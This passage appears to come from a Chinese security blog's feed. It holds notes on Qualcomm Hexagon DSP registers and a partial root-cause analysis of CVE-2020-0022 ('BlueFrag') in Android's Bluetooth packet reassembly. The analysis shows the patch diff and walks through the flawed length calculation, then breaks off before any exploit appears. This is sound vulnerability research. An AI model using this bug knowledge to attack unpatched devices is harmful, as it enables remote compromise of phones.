class="line">R2 &#x3D; memw(R0++M1) &#x2F;&#x2F; Auto-increment addressing mode (M1)</span><br><span class="line">R9 &#x3D; PC &#x2F;&#x2F; Get program counter (PC)</span><br><span class="line">LC1 &#x3D; R3 &#x2F;&#x2F; Set hardware loop count (LC1)</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033443.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033443.png"></a></p><p>控制寄存器别名规则：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033639.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033639.png"></a></p><p>控制寄存器同样可以被定义为寄存器对从而表示一个64位的寄存器，控制寄存器的凑对使用别名来定义，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C1:0 &#x3D; R5:4 &#x2F;&#x2F; C1:0 specifies the LC0&#x2F;SA0 register pair</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033809.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033809.png"></a></p><h4 id="程序计数器-Program-Counter（PC）"><a href="#程序计数器-Program-Counter（PC）" class="headerlink" title="程序计数器 Program Counter（PC）"></a>程序计数器 Program Counter（PC）</h4><p>PC 寄存器是用来指向下一个指令的位置. 他可以通过指令的执行来间接修改，也可被直接读取例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R7 &#x3D; PC &#x2F;&#x2F; Get program counter</span><br></pre></td></tr></table></figure><p>NOTE The PC register is read-only: writing to it has no effect.</p><h4 id="循环寄存器-Loop-registers"><a href="#循环寄存器-Loop-registers" class="headerlink" title="循环寄存器 Loop registers"></a>循环寄存器 Loop registers</h4><p>Hewxagon 的处理器包括两组循环寄存器用来支持嵌套的硬件循环, 每个循环包含了循环计数器以及循环开始位置的寄存器。循环寄存器可以通过 loop 指令修改，同时也可以直接访问，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">loop0(start, R4) &#x2F;&#x2F; Modifies LC0 and SA0 (LC0&#x3D;R4, SA0&#x3D;&amp;start)</span><br><span class="line">LC1 &#x3D; R22 &#x2F;&#x2F; Set loop1 count</span><br><span class="line">R9 &#x3D; SA1 &#x2F;&#x2F; Get loop1 start address</span><br></pre></td></tr></table></figure><h4 id="用户状态寄存器-User-Status-register"><a href="#用户状态寄存器-User-Status-register" class="headerlink" title="用户状态寄存器 User  Status register"></a>用户状态寄存器 User  Status register</h4><p>用户状态寄存器（USR）存储可由用户程序访问的处理器状态和控制位。状态位包含某些指令的状态结果，而控制位包含用户可设置的处理器模式，用于硬件预取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">R9:8 &#x3D; vaddw(R9:8, R3:2):sat &#x2F;&#x2F; Vector add words</span><br><span class="line">R6 &#x3D; USR &#x2F;&#x2F; Get saturation status</span><br></pre></td></tr></table></figure><p>USR 可包含一下的状态和控制值</p><ul><li><p>启用缓存预取 Cache prefetch enable</p></li><li><p>缓存预取状态 Cache prefetch status</p></li><li><p>浮点模式 Floating point modes</p></li><li><p>浮点状态 Floating point status </p></li><li><p>硬件回路配置 Hardware loop configuration</p></li><li><p>Sticky saturation overflow </p></li></ul><blockquote><p>NOTE A user control register transfer to USR cannot be grouped in an instruction packet with a floating point instruction (Section 4.3.4). Whenever a transfer to USR changes the Enable trap bits [29:25], an isync instruction (Section 5.10) must be executed before the new exception programming can take effect.</p></blockquote><h4 id="修饰寄存器-Modifier-registers"><a href="#修饰寄存器-Modifier-registers" class="headerlink" title="修饰寄存器  Modifier registers"></a>修饰寄存器  Modifier registers</h4><p>修饰寄存器用于 （M0-M1） 用于以下寻址模式</p><ul><li><p>间接自动递增寄存器寻址 Indirect auto-increment register addressing</p></li><li><p>循环寻址 Circular addressing</p></li><li><p>bit-reversed 寻址 Bit-reversed addressing</p></li></ul><p><strong>Indirect auto-increment register addressing</strong></p><p>在间接自动递增寄存器寻址中，修改符寄存器存储一个<br>带符号的32位值，用于指定增量（或减量）值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">M1 &#x3D; R0 &#x2F;&#x2F; Set modifier register</span><br><span class="line">R3 &#x3D; memw(R2++M1) &#x2F;&#x2F; Load word</span><br></pre></td></tr></table></figure><p><strong>Circular</strong></p><p>在循环寻址中，修饰寄存器存储循环缓冲区的长度和相关的 “k” 和 “I” 的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">M0 &#x3D; R7 &#x2F;&#x2F; Set modifier register</span><br><span class="line">R0 &#x3D; memb(R2++#4:circ(M0)) &#x2F;&#x2F; Load from circ buffer pointed</span><br><span class="line"> &#x2F;&#x2F; to by R2 with size&#x2F;K vals in M0</span><br><span class="line">R0 &#x3D; memb(R7++I:circ(M1)) &#x2F;&#x2F; Load from circ buffer pointed</span><br><span class="line"> &#x2F;&#x2F; to by R7 with size&#x2F;K&#x2F;I vals in M1 </span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312144717.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312144717.png"></a></p><p><strong>Bit-reversed</strong></p><p>在位反转寻址中，修改器寄存器存储带符号的32位 指定增量（或减量）值的值。例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">M1 &#x3D; R7 &#x2F;&#x2F; Set modifier register</span><br><span class="line">R2 &#x3D; memub(R0++M1:brev) &#x2F;&#x2F; The address is (R0.H | bitrev(R0.L))</span><br><span class="line"> &#x2F;&#x2F; The orginal R0 (not reversed) is added</span><br><span class="line"> &#x2F;&#x2F; to M1 and written back to R0</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312145512.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312145512.png"></a></p><h4 id="分支预测寄存器-Predicate-registers"><a href="#分支预测寄存器-Predicate-registers" class="headerlink" title="分支预测寄存器 Predicate registers"></a>分支预测寄存器 Predicate registers</h4><p>分支预测寄存器（P0-P3）保存了标量与矢量对比计算的结果，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">P1 &#x3D; cmp.eq(R2, R3) &#x2F;&#x2F; Scalar compare</span><br><span class="line">if (P1) jump end &#x2F;&#x2F; Jump to address (conditional)</span><br><span class="line">R8 &#x3D; P1 &#x2F;&#x2F; Get compare status (P1 only)</span><br><span class="line">P3:0 &#x3D; R4 &#x2F;&#x2F; Set compare status (P0-P3)</span><br></pre></td></tr></table></figure><p> 这四个分支预测寄存器可被设置成四倍状态，此时此四个寄存器被表示成一个32位的寄存器</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312145842.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312145842.png"></a></p><h4 id="循环起始寄存器-Circular-start-registers"><a href="#循环起始寄存器-Circular-start-registers" class="headerlink" title="循环起始寄存器 Circular start registers"></a>循环起始寄存器 Circular start registers</h4><p>循环起始寄存器（CS0-CS1）将循环缓冲区的起始地址存储在循环寻址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CS0 &#x3D; R5 &#x2F;&#x2F; Set circ start register</span><br><span class="line">M0 &#x3D; R7 &#x2F;&#x2F; Set modifier register</span><br><span class="line">R0 &#x3D; memb(R2++#4:circ(M0)) &#x2F;&#x2F; Load from circ buffer pointed</span><br><span class="line"> &#x2F;&#x2F; to by CS0 with size&#x2F;K vals in M0</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312150712.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312150712.png"></a></p><h4 id="用户通用指针寄存器-User-general-pointer-register"><a href="#用户通用指针寄存器-User-general-pointer-register" class="headerlink" title="用户通用指针寄存器 User general pointer register"></a>用户通用指针寄存器 User general pointer register</h4><p>The user general pointer (UGP) register is a general-purpose control register.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">R9 &#x3D; UGP &#x2F;&#x2F; Get UGP</span><br><span class="line">UGP &#x3D; R3 &#x2F;&#x2F; Set UGP</span><br></pre></td></tr></table></figure><p>UGP通常用于存储线程本地存储的地址。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312150913.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312150913.png"></a></p><h4 id="全局指针-Global-pointer"><a href="#全局指针-Global-pointer" class="headerlink" title="全局指针 Global pointer"></a>全局指针 Global pointer</h4><p>全局指针（GP）用于GP相对寻址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GP &#x3D; R7 &#x2F;&#x2F; Set GP</span><br><span class="line">R2 &#x3D; memw(GP+#200) &#x2F;&#x2F; GP-relative load</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312151031.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312151031.png"></a></p><h4 id="周期计数寄存器-Cycle-count-registers"><a href="#周期计数寄存器-Cycle-count-registers" class="headerlink" title="周期计数寄存器 Cycle count registers"></a>周期计数寄存器 Cycle count registers</h4><p>周期计数寄存器（UPCYCLELO-UPCYCLEHI）存储一个64位值，其中包含自从上次重置Hexagon处理器以来当前执行的处理器周期数。</p><p>[^NOTE]: The RTOS must grant permission to access these registers. Without this permission, reading these registers from user code always returns zero.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">R5 &#x3D; UPCYCLEHI &#x2F;&#x2F; Get cycle count (high)</span><br><span class="line">R4 &#x3D; UPCYCLELO &#x2F;&#x2F; Get cycle count (low)</span><br><span class="line">R5:4 &#x3D; UPCYCLE &#x2F;&#x2F; Get cycle count</span><br></pre></td></tr></table></figure><h4 id="帧限制寄存器-Frame-limit-register"><a href="#帧限制寄存器-Frame-limit-register" class="headerlink" title="帧限制寄存器  Frame limit register"></a>帧限制寄存器  Frame limit register</h4><p>帧限制寄存器（FRAMELIMIT）存储存储区的低地址为软件栈保留</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">R9 &#x3D; FRAMELIMIT &#x2F;&#x2F; Get frame limit register</span><br><span class="line">FRAMELIMIT &#x3D; R3 &#x2F;&#x2F; Set frame limit register</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312151516.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312151516.png"></a></p><h4 id="栈key寄存器-Frame-key-registe"><a href="#栈key寄存器-Frame-key-registe" class="headerlink" title="栈key寄存器 Frame key registe"></a>栈key寄存器 Frame key registe</h4><p>frame key register  （FRAMEKEY）当它们存储在软件堆栈中时返回地址时用来存储用于XOR加密的密钥值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">R2 &#x3D; FRAMEKEY &#x2F;&#x2F; Get frame key register</span><br><span class="line">FRAMEKEY &#x3D; R1 &#x2F;&#x2F; Set frame key register</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312151753.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312151753.png"></a></p><h4 id="数据包计数寄存器-Packet-count-registers"><a href="#数据包计数寄存器-Packet-count-registers" class="headerlink" title="数据包计数寄存器 Packet count registers"></a>数据包计数寄存器 Packet count registers</h4><p>数据包计数寄存器（PKTCOUNTLO-PKTCOUNTHI）存储一个64位值，其中包含自上次写入PKTCOUNT寄存器以来执行的指令数据包的当前数量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">R9 &#x3D; PKTCOUNTHI &#x2F;&#x2F; Get packet count (high)</span><br><span class="line">R8 &#x3D; PKTCOUNTLO &#x2F;&#x2F; Get packet count (low)</span><br><span class="line">R9:8 &#x3D; PKTCOUNT &#x2F;&#x2F; Get packet count</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312153022.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312153022.png"></a></p><h4 id="Qtimer寄存器"><a href="#Qtimer寄存器" class="headerlink" title="Qtimer寄存器"></a>Qtimer寄存器</h4><p>Qtimer寄存器（UTIMERLO-UTIMERHI）提供对Qtimer全局参考计数值的访问。 它们使Hexagon软件能够读取64位时间值，而不必执行昂贵的AHB加载。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">R5 &#x3D; UTIMERHI &#x2F;&#x2F; Get Qtimer reference count (high)</span><br><span class="line">R4 &#x3D; UTIMERLO &#x2F;&#x2F; Get Qtimer reference count (low)</span><br><span class="line">R5:4 &#x3D; UTIMER &#x2F;&#x2F; Get Qtimer reference count</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312152205.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312152205.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
    <summary type="html">最近在看高通的东西 这个就是按照手册过了一边，仅仅是个人的笔记。</summary>
    
    
    
    <category term="Summary" scheme="https://bestwing.me/categories/Summary/"/>
    
    
    <category term="hexagon" scheme="https://bestwing.me/tags/hexagon/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-0022 “BlueFrag”漏洞分析</title>
    <link href="https://bestwing.me/CVE-2020-0022-analysis.html"/>
    <id>https://bestwing.me/CVE-2020-0022-analysis.html</id>
    <published>2020-02-19T16:00:00.000Z</published>
    <updated>2020-06-22T18:28:30.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="Android蓝牙子系统“BlueFrag”漏洞分析"><a href="#Android蓝牙子系统“BlueFrag”漏洞分析" class="headerlink" title="Android蓝牙子系统“BlueFrag”漏洞分析"></a>Android蓝牙子系统“BlueFrag”漏洞分析</h2><p>漏洞位于：hci/src/packet_fragmenter.cc</p><h3 id="HCI-层"><a href="#HCI-层" class="headerlink" title="HCI 层"></a>HCI 层</h3><p>HCI 层位于蓝牙协议栈高层协议和低层协议之间，提供了对基带控制器和链路管理器的命令以及访问蓝牙硬件的统一接口方法，其接口适用于BR/EDR控制器、BR/EDR/LE控制器、LE控制器、AMP控制器，与底层的结构关系如下图：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200623022501.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200623022501.png"></a></p><h4 id="HCI-包格式"><a href="#HCI-包格式" class="headerlink" title="HCI 包格式"></a>HCI 包格式</h4><p>HCI通过包的方式来传送数据、命令和事件的，所有在主机和主机控制器之间的通信都以包的形式进行。包括每个命令的返回参数都通过特定的事件包来传输。HCI有数据、命令和事件三种类型的包。命令包COMMAND（0x01）只能从主机发往主机控制器，其中数据包是双向的，分为两类：ACL（0x02）、SCO（0x03），而事件包EVENT（0x04）始终是主机控制器发向主机的。主机发出的大多数命令包都会触发主机控制器产生相应的事件包作为响应，在传输过程中会有一个句柄，用于识别主机之间的逻辑通道和控制器，共有三种类型的句柄：连接句柄、逻辑链路句柄和物理链路句柄。</p><p>根据需要，这里只介绍ACL数据包格式，ACL 数据用于主机和控制器之间的非同步数据交换，如播放音乐数据的数据包，格式如下图：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200623022525.png" title="img" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200623022525.png" alt="img"></a></p><p>字段说明：</p><table><thead><tr><th><strong>字段</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td><strong>Handle</strong></td><td>Connection_Handle用于在主控制器上传输数据包或段。</td></tr><tr><td><strong>PB  Flag</strong></td><td>包边界和适应范围。</td></tr><tr><td><strong>BC  Flag</strong></td><td>广播标志。</td></tr><tr><td><strong>Data  Total Length</strong></td><td>以八位位组为单位的数据长度，包含高层协议data。</td></tr></tbody></table><p>其中 PB FLAGS  是我们要注意的  ，设置为 00’b 的时候，代表 Host -&gt; Contoller 的 L2CAP 的首包。设置为 01’b 的时候，代表 Host -&gt; Contoller 或者 Contoller -&gt; Host 的 L2CAP 的续包（中间的）。设置为 10’b 的时候，代表 Contoller -&gt; Host 的 L2CAP 的首包。</p><table><thead><tr><th>字段</th><th>表示</th></tr></thead><tbody><tr><td>00’b -&gt; 0</td><td>Host -&gt; Contoller 的 L2CAP 的首包</td></tr><tr><td>01’b -&gt; 1</td><td>Host -&gt; Contoller 或者 Contoller -&gt; Host 的 L2CAP 的续包</td></tr><tr><td>10’b -&gt; 2</td><td>设置为 10’b 的时候，代表 Contoller -&gt; Host 的 L2CAP 的首包。</td></tr></tbody></table><h3 id="L2CAP-数据包格式"><a href="#L2CAP-数据包格式" class="headerlink" title="L2CAP 数据包格式"></a>L2CAP 数据包格式</h3><p>上面提到了 L2CAP ，那么什么是L2CAP呢？</p><h4 id="分段（Fragmentation）和重组（Reassembly-）"><a href="#分段（Fragmentation）和重组（Reassembly-）" class="headerlink" title="分段（Fragmentation）和重组（Reassembly ）"></a>分段（Fragmentation）和重组（Reassembly ）</h4><p>这里需要提及一下 分段与重组</p><p>分段是将PDU分解成较小的部分，以便从L2CAP传递到较低层。重组是根据从下层传递来的片段重组PDU的过程。分段和重组可以应用于任何L2CAP PDU。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161312.png" title="image-20200214163251779" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161312.png" alt="image-20200214163251779"></a></p><p>我们可以简单把  L2CAP 当成 HCI data payload</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161328.png" title="image-20200214163406198" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161328.png" alt="image-20200214163406198"></a> </p><h4 id="数据包格式"><a href="#数据包格式" class="headerlink" title="数据包格式"></a>数据包格式</h4><p>L2CAP是基于分组的，但也遵循信道传输的通信模型。L2CAP支持的信道有两种：面向连接的信道和面向无连接的信道。在面向连接的信道中，L2CAP数据包的格式如下图所示</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200623022552" title="img" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200623022552" alt="img"></a></p><p>数据包中每个字段的说明如下所示：</p><table><thead><tr><th><strong>字段</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td><strong>Length</strong></td><td>2字节，表示信息有效负载的大小，不包括长度L2CAP头。</td></tr><tr><td><strong>Channel  ID**</strong>（**<strong>CID**</strong>）**</td><td>2字节，用于标识目的信道的终端。通道ID的范围与正在发送数据包的设备相关。</td></tr><tr><td><strong>Information**</strong>（**<strong>Payload**</strong>）**</td><td>信息负载。长度为0到65535字节。</td></tr></tbody></table><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>CVE-2020-0022漏洞位于HCI层，漏洞补丁代码位于hci/src/packet_fragmenter.cc（以8.1.0_r33为例）中的reassemble_and_dispatch()函数中，该函数是用于数据包分片的重组。对于过长的ACL数据包需要进行包的重组，主要是根据ACL包中的PB Flag标志位进行重组，如果当前是起始部分并且是不完整的，则生成一个部分包（partial_packet）放到map里，等下次收到它的后续部分进行拼装，拼装完毕后就分发出去。详细分析reassemble_and_dispatch()函数如下：</p><h3 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h3><p>clone 一份代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://android.googlesource.com/platform/system/bt</span><br><span class="line"><span class="built_in">cd</span> bt </span><br><span class="line">checkout 771571</span><br></pre></td></tr></table></figure><p>咱们先看 一眼 patch：</p><p><a href="https://android.googlesource.com/platform/system/bt/+/3cb7149d8fed2d7d77ceaa95bf845224c4db3baf^!/">https://android.googlesource.com/platform/system/bt/+/3cb7149d8fed2d7d77ceaa95bf845224c4db3baf%5E%21/</a></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/hci/src/packet_fragmenter.cc b/hci/src/packet_fragmenter.cc</span><br><span class="line">index 5036ed5..143fc23 100644</span><br><span class="line"><span class="comment">--- a/hci/src/packet_fragmenter.cc</span></span><br><span class="line"><span class="comment">+++ b/hci/src/packet_fragmenter.cc</span></span><br><span class="line"><span class="meta">@@ -221,7 +221,8 @@</span></span><br><span class="line">                  &quot;%s got packet which would exceed expected length of %d. &quot;</span><br><span class="line">                  &quot;Truncating.&quot;,</span><br><span class="line">                  __func__, partial_packet-&gt;len);</span><br><span class="line"><span class="deletion">-        packet-&gt;len = partial_packet-&gt;len - partial_packet-&gt;offset;</span></span><br><span class="line"><span class="addition">+        packet-&gt;len =</span></span><br><span class="line"><span class="addition">+            (partial_packet-&gt;len - partial_packet-&gt;offset) + packet-&gt;offset;</span></span><br><span class="line">         projected_offset = partial_packet-&gt;len;</span><br><span class="line">       &#125;</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>将 packet-&gt;len 的值在原本的基础上加上了 packet-&gt;offset</p><h3 id="code-review"><a href="#code-review" class="headerlink" title="code review"></a>code review</h3><p>代码处理逻辑在 <code>reassemble_and_dispatch</code> 函数里：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161342.png" title="image-20200214164211428" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161342.png" alt="image-20200214164211428"></a></p><p>首先读取相关变量， handle 和 acl_length :</p><ul><li><p>handle  相当于链接 seesion</p></li><li><p>acl_length 则为 Data Total Length 这是包括 header + data</p><p>131 行校验 长度是否合法</p></li></ul><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161345.png" title="image-20200214164743418" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161345.png" alt="image-20200214164743418"></a></p><p>133 行 通过 handle 读取 boundary_flag ，就是前文提及的 PB flag</p><p>136 行 判断 PB flag 是否为 2 ，即 是否为 <strong>Contoller -&gt; Host</strong> 的 L2CAP 的首包，如是则进入 if 条件分支</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161349.png" title="image-20200214165424356" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161349.png" alt="image-20200214165424356"></a></p><p>145 的分支则判断 packet 是否已经被处理过</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161354.png" title="image-20200214165740960" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161354.png" alt="image-20200214165740960"></a></p><p>156 行则判断  acl_length 是否正常</p><p>然后紧接着计算 full_length ，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint16_t</span> full_length =</span><br><span class="line">    l2cap_length + L2CAP_HEADER_SIZE + HCI_ACL_PREAMBLE_SIZE;</span><br></pre></td></tr></table></figure><p>L2cap_length 也是从 stream 读取的</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161357.png" title="image-20200214165946945" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161357.png" alt="image-20200214165946945"></a></p><p>上面提及了 acl_length为Data Total Length，该data数据域中存放着L2CAP数据包分片（也可能是一个完整的L2CAP数据包） 则 l2cap_length 是一个完整的L2CAP数据包中payload的长度。</p><p>所以 full_length = 完整的L2CAP数据包中的payload的长度 + 一个L2CAP头部长度和一个HCI头部长度</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161401.png" title="image-20200214170805275" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161401.png" alt="image-20200214170805275"></a></p><p>168 行 又是一次数据大小检查</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161404.png" title="image-20200214170947166" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161404.png" alt="image-20200214170947166"></a></p><p>177 行开始，通过检查大小 判断当前 packet 是否还有后续的包，如果没有就直接 <code>callbacks-&gt;reassembled(packet);</code>并返回</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161410.png" title="image-20200214171432668" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161410.png" alt="image-20200214171432668"></a></p><p>如果有后续包，则开始进一步处理</p><ul><li><p>分配一块内存，用来 packet 数据重组</p></li><li><p>设置一些变量，partial_packet-&gt;event 、 partial_packet-&gt;len、partial_packet-&gt;offset</p><p>其中：<code>partial_packet-&gt;len = full_length;</code> 以及<code>partial_packet-&gt;offset = packet-&gt;len;</code></p><p>将partial_packet-&gt;len设置为full_length，将partial_packet-&gt;offset设置为packet-&gt;len即当前头包packet-&gt;data的长度</p></li><li><p>调用memcpy，将头包packet中HCI数据包整体拷贝到partial_packet中</p></li><li><p>更新acl_length为一个完整的L2CAP数据包长度</p></li><li><p>200 行 将partial_packet存放到容器中</p></li><li><p>最后 释放当前头包packet，表示已经处理完第一个packet</p></li></ul><p>当下一个包过来，且不是首包的时候，就会进入到</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161414.png" title="image-20200214171915985" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161414.png" alt="image-20200214171915985"></a></p><p>204 行这个分支</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161418.png" title="image-20200214172003177" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161418.png" alt="image-20200214172003177"></a></p><p>206 行，判断通过 handle 判断当前包是否是一个链路里的，否则 drop</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161423.png" title="image-20200214173502465" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161423.png" alt="image-20200214173502465"></a></p><p>215 行，  设置 packet-&gt;offset 等于 HCI_ACL_PRESMBLE_SIXE 即等于4 ，此时 packet-&gt;offset 就指向了  data 域</p><p>216 行，  开始计算 projected_offset ,等于 partial_packet-&gt;offset 与 (packet-&gt;len - HCI_ACL_PREAMBLE_SIZE) 之和：</p><p>​    此时</p><ul><li>projected_offset为partial_packet-&gt;offset</li><li>(packet-&gt;len - HCI_ACL_PREAMBLE_SIZE) 为 L2CAP数据包分片</li></ul><p>则，projected_offset 为 partial_packet-&gt;offset +  L2CAP数据包分片</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161425.png" title="image-20200214174007323" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161425.png" alt="image-20200214174007323"></a></p><p>接着就是重要的地方了，判断  projected_offset 是否大于 partial_packet-&gt;len</p><p>projected_offset 是刚才求和的结果 ， partial_packet-&gt;len 则  full_lenght </p><p><a 